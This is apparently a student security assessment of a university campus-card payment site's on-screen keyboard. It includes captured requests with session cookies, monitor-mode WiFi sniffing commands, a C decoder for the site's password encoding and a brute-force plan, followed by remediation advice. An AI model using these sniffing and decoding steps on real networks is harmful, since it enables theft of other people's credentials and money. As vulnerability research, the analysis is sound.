# 逆向分析/点评 #
## 屏幕键盘的原理和安全性分析 ##

分析对象至少应包含以下2家：

### 1 中传的一卡通在线充值转账系统 

2 建设银行个人网银登录

对比直接使用物理键盘方式输入密码，屏幕键盘是否改进了安全性？请详细阐述理由。

## 目录 ##

**1、 一卡通在线充值转账系统概述**

-   基本情况
-   登录界面
-   软键盘安全性


**2、  探查分析**

- chorme浏览器Network工具

**3、 初步实验**

- 穷举密码、分析规律

**4、 提出猜想**

- 软键盘存在的漏洞
- 密码的获取方法

**5、深度实验**

- 工具及实验环境
- 实验过程及结果
- 漏洞利用、编写代码

**6、安全建议**  

- 深层分析  
- 提出建议

## 正文 ##

###1、 一卡通在线充值转账系统概述###

####基本情况：####

校园卡电子服务平台 [http://ykt.cuc.edu.cn/](http://ykt.cuc.edu.cn/)
用校外网无法登录此电子服务平台。校园卡电子服务平台未加密，为http协议，登录时使用CAS认证。
> CAS = Central Authentication Service，中央认证服务，一种独立开始指令协议。CAS 是 Yale 大学发起的一个开源项目，旨在为 Web 应用系统提供一种可靠的单点登录方法，CAS 在 2004 年 12 月正式成为 JA-SIG 的一个项目。
> ![CAS认证](http://b.hiphotos.baidu.com/baike/c0%3Dbaike180%2C5%2C5%2C180%2C60/sign=fff8c229b9014a9095334eefc81e5277/f3d3572c11dfa9ec6bfc2b8c62d0f703908fc15f.jpg)
> 从结构上看，CAS 包含两个部分： CAS Server 和 CAS Client。CAS Server 需要独立部署，主要负责对用户的认证工作；CAS Client 负责处理对客户端受保护资源的访问请求，需要登录时，重定向到 CAS Server。

####登录界面：####

![校园卡电子服务平台登录界面](http://i.imgur.com/3IUuLDc.png)

####软件盘安全性：####

连续刷新十次，得到不同的软键盘：

1. 9721685430
2. 7613095824
3. 2831406975
4. 2367904158
5. 1836450297
6. 5179482630
7. 9816235704
8. 1873526490
9. 9524378610
10. 9182034675

可以看到，每次软键盘数字的排列都是随机打乱的。

    由chorme开发者工具得到的代码：

    <p id="p_cxmm" class="cardTransferInfo">
        <label>
            查询密码：</label>
        <input type="password" id="Password" name="password" readonly="readonly" maxlength="6" class="validate[required,minSize[6],maxSize[6]]" style="background-color:#f99; border:#f00 1px solid;"><span class="red">*(校园卡查询密码)</span></p>
    <div class="virtualKey" id="password_key_transfer" style="">
        <img src="/Account/GetNumKeyPadImg" alt="密码键盘" usemap="#keyboardMapForPwd" width="300" height="61">
        <map name="keyboardMapForPwd" id="keyboardMapForPwd">
            <area shape="rect" coords="4,3,29,28" value="0">
            <area shape="rect" coords="33,3,58,28" value="1">
            <area shape="rect" coords="62,3,88,28" value="2">
            <area shape="rect" coords="92,3,118,28" value="3">
            <area shape="rect" coords="122,3,148,28" value="4">
            <area shape="rect" coords="152,3,178,28" value="5">
            <area shape="rect" coords="182,3,207,28" value="6">
            <area shape="rect" coords="211,3,236,28" value="7">
            <area shape="rect" coords="241,3,266,28" value="8">
            <area shape="rect" coords="270,3,295,28" value="9">
            <area shape="rect" coords="5,33,74,148" value="Backspace">
            <area shape="rect" coords="78,33,221,148" value="Clear">
            <area shape="rect" coords="227,33,295,148" value="Close">
        </map>
    </div>
    

从这段代码中，可以发现：

- 密码键盘不是真正可点击键盘，而是一个图像，其地址为：/Account/GetNumKeyPadImg。浏览器中输入此地址，是不可以看到相应图像键盘的。
- 代替键盘输入的方式，是用shape、coords等HTML元素规定区域的尺寸、形状和位置，点击坐标区域给出相应value。

###2、  探查分析###

#### chorme浏览器：####

可探查到：

![data](http://image17-c.poco.cn/mypoco/myphoto/20151126/11/17868435620151126113627029_640.jpg?330x109_130)

此passord与输入的并不一致。

可探测到Cookie：

![cookie](http://image17-c.poco.cn/mypoco/myphoto/20151126/11/17868435620151126113456058_640.jpg?894x385_130)

使用network工具：

**General:**  
Remote Address:202.205.25.18:80

> 此处可以直接使用远程IP地址转到目的网页。 
 
Request URL:http://ykt.cuc.edu.cn/CardManage/CardInfo/TransferAccount

>  未进行权限处理，可以看到 Request URL下的数据：
>  {"ret":false,"msg":"验证码不正确"}

Request Method:POST  
Status Code:200 OK

>200请求成功 303重定向 400请求错误 401未授权 
>403禁止访问 404文件未找到 500服务器错误

**Response Headers:**  
Cache-Control:private  
Content-Length:55  
Content-Type:application/json; charset=utf-8  
Date:Thu, 26 Nov 2015 03:57:47 GMT  
Server:Microsoft-IIS/7.5  
X-AspNet-Version:4.0.30319  
X-AspNetMvc-Version:3.0  
X-Powered-By:ASP.NET

**view source:**  
HTTP/1.1 200 OK  
Cache-Control: private  
Content-Type: application/json; charset=utf-8  
Server: Microsoft-IIS/7.5  
X-AspNetMvc-Version: 3.0  
X-AspNet-Version: 4.0.30319  
X-Powered-By: ASP.NET  
Date: Thu, 26 Nov 2015 03:57:47 GMT  
Content-Length: 55  

**Request Headers:**  
Accept:*/*  
Accept-Encoding:gzip, deflate  
Accept-Language:zh-CN,zh;q=0.8  
Connection:keep-alive  
Content-Length:81  
Content-Type:application/x-www-form-urlencoded  
Cookie:ASP.NET_SessionId=1fj4eivlu2cgee3onxpy5c1g;   
iPlanetDirectoryPro=U3luU25vXzIwMTMxMTEyMzAyN18yMDE1MTEyNjExNTY1MDQ4MTA%3d  
Host:ykt.cuc.edu.cn  
Ori gin:http://ykt.cuc.edu.cn  
Referer:http://ykt.cuc.edu.cn/  
User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36  
X-Requested-With:XMLHttpRequest

**view source:**
POST /CardManage/CardInfo/TransferAccount HTTP/1.1  
Host: ykt.cuc.edu.cn  
Connection: keep-alive  
Content-Length: 81  
Accept: */*  
Origin: http://ykt.cuc.edu.cn  
X-Requested-With: XMLHttpRequest  
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36  
Content-Type: application/x-www-form-urlencoded  
Referer: http://ykt.cuc.edu.cn/  
Accept-Encoding: gzip, deflate

> DEFLATE是同时使用了LZ77算法与哈夫曼编码（Huffman Coding）的一个无损数据压缩算法。
> 
> GZIP最早由Jean-loup Gailly和Mark Adler创建，用于UNⅨ系统的文件压缩。我们在Linux中经常会用到后缀为.gz的文件，它们就是GZIP格式的。现今已经成为Internet 上使用非常普遍的一种数据压缩格式，或者说一种文件格式。


Accept-Language: zh-CN,zh;q=0.8  
Cookie: ASP.NET_SessionId=1fj4eivlu2cgee3onxpy5c1g; iPlanetDirectoryPro=U3luU25vXzIwMTMxMTEyMzAyN18yMDE1MTEyNjExNTY1MDQ4MTA%3d

**Form Data:**  
password:499409  
checkCode:7383  
amt:10.00  
fcard:bcard  
tocard:card  
bankno:  
bankpwd:

**view source:**
password=499409&checkCode=7383&amt=10.00&fcard=bcard&tocard=card&bankno=&bankpwd=

###3、  初步实验###

#### 穷举分析：####

在查询密码处使用电子键盘进行输入，不论键盘的随机性如何改变：
以下列软键盘为例：

![软键盘例子](http://i.imgur.com/vmEnCKU.png)

若输入6个第一个键盘上的数7，则network中password的值为6个0.
若输入6个第二个键盘上的数1，则network中password的值为6个1，以此类推。
7120465389
若输入777111，则network中password的值为111000.
若输入111222，则network中password的值为222111，以此类推。


若输入771122，则network中password的值为221100.
若输入998833，则network中password的值为778899，以此类推。

又经过了数次实验后，基本可以推出：键盘给后端或服务器的上传值并不是软键盘本身的数值。而是相当于7120465389对应着顺序序列0123456789，输入7则反馈为0.
但是这种反馈并不是简单的置换，经过数次实验后，可以得出：上传值是对应着顺序序列0123456789并加上一些简单的反转得出。如若输入771122，network中的反馈值并不是0011122，而是经过反转后的221100.

再次实验，此时输入的值不是简单的具有排列规则的数字串了。

实验一：
> 以“024004”为例，network中的反馈值为“433423”.
> 
> 软键盘：   7  1  2  0  4  6  5  3  8  9
> 
> 顺序序列： 0  1  2  3  4  5  6  7  8  9
> 
> 输入： 024004
> 分析：
> 软键盘上，数字“0”对应顺序序列“3”，数字“2”对应顺序序列“2”，数字“4”对应顺序序列“4”。
> 经过顺序序列翻译过的输入应该为“324334”.
> 
> 而network中的反馈值为“433423”.正好为顺序序列翻译过的输入“324334”的反转值。匹配成功！

实验二：

> 以“201530”为例，network中的反馈值为“376132”.
> 
> 软键盘：   7  1  2  0  4  6  5  3  8  9
> 
> 顺序序列： 0  1  2  3  4  5  6  7  8  9
> 
> 输入： 201530
> 分析：
> 软键盘上，数字“2”对应顺序序列“2”，数字“0”对应顺序序列“3”，数字“1”对应顺序序列“1”，数字“5”对应顺序序列“6”，数字“3”对应顺序序列“7”。
> 经过顺序序列翻译过的输入应该为“231673”.
> 
> 而network中的反馈值为“376132”.正好为顺序序列翻译过的输入“231673”的反转值。匹配成功！

###4、 提出猜想###

####软键盘存在的漏洞：####
我之所以能够分析成功，是因为网页每次进行提交的时候并没有刷新键盘。这样在我输入错误的时候，下次我还是可以使用同样的一个键盘进行分析，从而找出了规律。
####密码的获取方法：####

如果采用这样的网络屏幕键盘，如果攻击者抓到了network交互中的POST包，可获取其中的password值，进而可经过一系列分析得出使用者的密码。  

经过分析后，我觉得也许可以通过某种方式获得屏幕软键盘信息或软键盘图片，配合同一个局域网内捕捉到的Network中的POST包，破解出用户密码。

此网站登录可以在CUC下，而CUC又是一个没有加密的WiFi，也许捕捉到的是明文密码？

###5、深度实验###

####工具及实验环境
工具：  
无线网卡 Manufacturer_Realtek_RTL8187_ RTL8187_Wireless [0100]  
笔记本电脑 联想Z500  
手机一台

实验环境：  
WIN7系统    
安装了kali系统的Oracle VM VitualBox  
wireshark抓包软件

####实验过程及结果####
1 连接好网卡并进行网卡的接入，打开kali虚拟机。  
2 进入系统后，运行终端Terminal。  
3 执行命令`ifconfig`，查看当前网卡名称。
![ifconfig](http://i.imgur.com/5MquiaT.png)  

4 执行命令`airmon-ng start wlan0`设置wlan0工作在监听模式。  
![airmon-ng start wlan1](http://i.imgur.com/UIaZ5P4.png)  

5 以下3步是解决部分无线网卡在Kali 2.0系统中设置监听模式失败的解决方法。 

    ifconfig wlan0mon down
    iwconfig wlan0mon mode monitor
    ifconfig wlan0mon up  

6 执行命令`airodump-ng wlan0mon`，开始以channel hopping模式抓包，CTRL-C退出当前抓包。
![airodump-ng wlan0mon](http://i.imgur.com/3I2X34b.png)  
![airodump-ng wlan0mon](http://i.imgur.com/L3vy5wJ.png)
可以知道，CUC的工作channel（图中CH）一般是11。

7 执行命令`airodump-ng wlan0mon --channel 11 -w saved`指定工作channel 11 监听并将结果保存到本地文件，以上命令会在当前目录保存文件名为saved-NN的几个文件：.cap、.csv、.kismet.csv、.kismet.netxml。其中NN按照从01开始编号，重复执行上述命令多次，捕获到的数据报文会保存在不同编号的.cap文件中。

![channel 13](http://i.imgur.com/CV1Qnec.png)

8 用wireshark打开.cap文件，在Filter中输入命令`http.request.method== "POST"`过滤POST包。查看手机，手机的IP地址为10.195.13.135。有了这两个条件，则可以快速定位到指定POST包。

![POST包](http://i.imgur.com/ac9FgCY.png)

灰色的包就是我们的目标！右键Follow TCPSteam，则得到以下数据！

![Follow TCPSteam](http://i.imgur.com/zgY0Me8.png)

这个包中可以发现什么呢？红色部分的最后一行！  
可以看到密码password，验证码checkcode的明文数值。  

现在只通过一个无线网卡和与目标加入同一局域网，我获得了目标的密码值。

**漏洞利用、编写代码**

经过了实验，可以看到，我们已经获得了目标的密码值。这个密码是经过“3、初步分析”中所说的加密算法加密的。
但是抓到的POST包中并没有有关于用户名的信息。

那么，用户名去哪里了呢？可以发现，转账界面有以下数据：

![](http://i.imgur.com/UeQEMNg.png)

这个信息是从哪里来的呢？往前追溯，在进入转账界面之前，有一个身份验证界面：

![](http://i.imgur.com/pIPG6eX.jpg)

也许在身份验证的同时，个人信息（账号）已经POST给了后台以某种方式在数据库中存储起来了。所以在转账阶段不需要再POST一次用户账号，而只用POST在转账阶段输入的信息。所以我们抓包的时候也要分析前一个包，记录下用户账号信息。

那么如何利用这个漏洞呢？

在初步分析阶段，我们发现每次做出POST请求时没有刷新页面，也没有更换屏幕键盘。我们又可以做出以下两种猜想：  

**捕捉到输入密码时的屏幕键盘图片**  

可以直接使用抓包抓到的数据与其一一对应推测出用户的真实密码。具体分析见第3步初步分析。

*让我们用代码来实现它，源码如下：*

    #include<stdlib.h>
    #include<stdio.h>
    int main()
    {
    	int i,j,input,middle;
    	long long keyboard;
    	int count = 0;
    	char Char2Int[2];
    	char Input[10];
    	char Output[10];
    	char Middle[10];
    	char Keyboard[20];
    	printf("Please input the encryption password:");
    scanf("%d", &input);
    	sprintf(Input, "%d", input);
    
    	printf("Please input the keyboard number:");
    	scanf("%lld", &keyboard);
    	sprintf(Keyboard, "%lld", keyboard);
    
    	printf("\nYour Input:"); 
    	printf("\nEncryption password:");
    	for (i = 0;i < 10;i++)
    	{
    		if(Input[i]<= '9' && Input[i]>= '0')
    		{
    			count++;
    			printf("%c", Input[i]);
    		}
    		
    	}
    	printf("\npassword:");
    	j = count;
    	for (i = 0;i < count;i++)
    	{
    		Middle[j] = Input[i];
    		j--;
    	}
    	for (i = 0;i < 10;i++)
    	{
    		if (Middle[i] <= '9' && Middle[i] >= '0')
    		{
    			printf("%c", Middle[i]);
    		}
    	}
    
    	printf("\nKeyboard number:");
    	for (i = 0;i < 20;i++)
    	{
    		if (Keyboard[i] <= '9' && Keyboard[i] >= '0')
    		{
    			printf("%c", Keyboard[i]);
    		}
    	}
    	printf("\n\nUser's password:");
    	for (i = 0;i < 10;i++)
    	{
    		if (Middle[i] <= '9' && Middle[i] >= '0')
    		{
    			Char2Int[0] = Middle[i];
    			middle =atoi(Char2Int);
    			Output[i] = Keyboard[middle];
    			printf("%c", Output[i]);
    		}
    	}
    	printf("\n");
    	system("pause");
    }

实验两个3中的数据：

![](http://i.imgur.com/0z5IKS2.png)

![](http://i.imgur.com/y6VJoel.png)

**未捕捉到输入密码时的屏幕键盘图片**  

不考虑屏幕键盘的前提下，也许可以使用arp欺骗的方式访问用户的登录界面。

未捕捉到并不代表这个密码是不可被攻破的。我们可以根据第3部初步分析得知，加密后的数字相同位则密码也相同。即抓到的password799759的原密码中，一定有三个与9对应的数字，两个与7对应的数字，且原密码的顺序为957997.那么分别令5、7、9对应的原密码位为“0、1、2、3、4、5、6、7、8、9”，在“POST请求时没有刷新页面，也没有更换屏幕键盘”这个前提下进行穷举攻击。可以经过这种方法暴力破解出密码。

> 而这种破解通常也不会耗费太多的资源。  
> 最简单的单数字6位（如111111）：需实验10次  
> 最复杂的不重复6位（如123456）：每一位有10种可能，需实验1000000次。  

为什么是100000次呢？因为在对破解分析的过程中，又发现一个安全隐患。

![](http://i.imgur.com/CtLb1CH.png)

在试图对密码进行修改的过程中，我们可以发现密码只允许为6位！那么这就为黑客排除了密码位数小于5和大于6的可能，只将范围锁定在6位，大大缩小了攻击范围。

*让我们用代码来实现它*

如果用代码来实现它，还是可以使用数组str[n]的存储方式，记录下相同的数字所在的位置（如024004中的三个0的位置分别为str[0],str[3],str[4]的0，3，4）。那么可以使用相同的数字去替代这三个位置。其余的数0~9都要进行一次分析。

这样穷举的成千上万个密码中，总有一个是原用户密码。

###6、 安全建议：###
#### 深层分析：####

1. 通用弱点评价体系，Common Vulnerability Scoring System(简称CVSS)，是由美国国土安全部主导的NIAC开发，视图量化评估漏洞的影响大小（危害程度）。  
参考资料：通用弱点评价体系（CVSS）简介
[http://xfocus.net/releases/200602/a850.html](http://xfocus.net/releases/200602/a850.html) 
![CVSS](http://i.imgur.com/D0cT0PY.jpg)

针对一卡通登录漏洞，可作出以下分析：

攻击途径：远程 0.7  
攻击复杂度：中 0.8  
认证：需要 0.6  
机密性：部分地 0.7  
完整性：部分地 0.7  
可用性：部分地 0.7  
权值倾向：平均 0.333  

利用代码：验证方法 0.9  
修正措施：无 1  
确认程度：未经确认 0.95

影响：中 0.3  
目标分布：高（100%）1

按照文章所给的注释，这个漏洞是一个两个月内需解决的漏洞。

> 以下注释来源于必应（cn.bing.com）：  
> 本地攻击 (Local attack) – 黑客进入目标电脑，直接从目标电脑内发动攻击，例如偷取系统机密档案、或更改使用权限等。  
> 远端攻击 (Remote attack) – 从电脑网路上对目标电脑发动远端攻击，例如远端操控电脑或登入等。  
> 机密性：确保只有经授权(authorized)的人才能存取资讯。  
> 完整性：在传输、存储信息或数据的过程中，确保信息或数据不被未授权的篡改或在篡改后能够被迅速发现。  
> 可用性：是网络信息可被授权实体访问并按需求使用的特性。

2.针对分层模型：  

![分层模型](http://i.imgur.com/OZQYdiZ.png)  

我们在应用层这一层上，实现了漏洞挖掘、分析与利用，并利用代码实现了部分功能。

#### 提出建议：####

2. 最重要的一点：更换前后端交互时的简单密码加密算法。
1. 实现从http协议到https协议的转变。实现全站加密。
2. 每次做出POST请求时自动刷新页面，更换屏幕键盘。
3. 禁止使用[http://ykt.cuc.edu.cn/Account/GetNumKeyPadImg](http://ykt.cuc.edu.cn/Account/GetNumKeyPadImg)的方式直接访问后台数据。
3. 避免查询密码处的提示：“密码长度最小为6位”。这样的设计是不合理的，给黑客排除了很多密码。
4. 允许多种长度的密码的存储，而不单单将密码位数限制在6位。
